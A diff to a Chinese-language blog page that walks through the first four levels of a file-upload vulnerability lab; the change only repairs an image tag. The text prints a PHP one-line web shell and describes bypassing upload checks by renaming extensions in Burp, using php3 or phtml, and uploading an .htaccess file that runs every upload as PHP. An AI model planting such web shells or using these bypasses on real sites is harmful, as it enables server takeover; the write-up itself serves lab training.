@@ -160,7 +160,7 @@
             </div>
             <!-- Post -->
             <div class="typo" style="padding: 3rem;">
-                <h2 id="Pass1"><a href="#Pass1" class="headerlink" title="Pass1"></a>Pass1</h2><p>Pass上传一个php一句话文件<br><code>&lt;?php @eval($_POST[cmd]);?&gt;  </code><br>保存为.php格式<br><img src="1.1.png"><br>发现不允许上传php文件,将一句话木马改为.png,然后使用burp拦截，再将文件后缀名改为php后，放包<br><img src="1.2.png"><br><img src="1.3.png"><br>上传成功后，复制链接，用蚁剑连接<br>![](1.35.png<br><img src="1.4.png"><br>连接成功</br></p>
+                <h2 id="Pass1"><a href="#Pass1" class="headerlink" title="Pass1"></a>Pass1</h2><p>Pass上传一个php一句话文件<br><code>&lt;?php @eval($_POST[cmd]);?&gt;  </code><br>保存为.php格式<br><img src="1.1.png"><br>发现不允许上传php文件,将一句话木马改为.png,然后使用burp拦截，再将文件后缀名改为php后，放包<br><img src="1.2.png"><br><img src="1.3.png"><br>上传成功后，复制链接，用蚁剑连接<br><img src="1.35.png"><br><img src="1.4.png"><br>连接成功</br></p>
 <h2 id="Pass2"><a href="#Pass2" class="headerlink" title="Pass2"></a>Pass2</h2><p>Pass2与Pass1相同，不再赘述</p>
 <h2 id="Pass3"><a href="#Pass3" class="headerlink" title="Pass3"></a>Pass3</h2><p>Pass3我们用第一关的方法上传png文件改包后发现不行<br>猜测应该是吧这几个后缀名放到黑名单了。我们可以上传例如php3, phtml后缀的文件绕过，重复上述操作后，上传成功。</p>
 <h2 id="Pass4"><a href="#Pass4" class="headerlink" title="Pass4"></a>Pass4</h2><p>Pass4观察源码发现，php3等文件类型也添加到了黑名单中<br><img src="4.1.png"><br><img src="4.2.png"><br>这一关首先创建一个hetccess文件，当中写入<br><code>SetHandler application/x-httpd-php  </code><br>目的就是把我们上传的文件全部转成.php的。<br><img src="4.3.png"><br>上传.hetccess文件以后，直接上传png格式的一句话木马就可以<br><img src="4.4.png"><br>连接成功</p>
